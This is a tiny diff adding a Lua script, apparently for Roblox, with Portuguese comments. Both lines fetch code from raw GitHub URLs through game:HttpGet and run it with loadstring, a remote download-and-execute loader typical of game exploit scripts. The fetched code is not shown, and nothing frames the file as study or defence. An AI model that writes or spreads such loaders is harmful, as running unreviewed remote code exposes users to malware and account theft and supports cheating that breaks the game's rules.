@@ -1,0 +1,5 @@
+-- Executa o primeiro script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptsByZam/RoScript/refs/heads/main/Script2"))()
+
+-- Executa o segundo script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LiarRise/Speed/refs/heads/main/README.md"))()
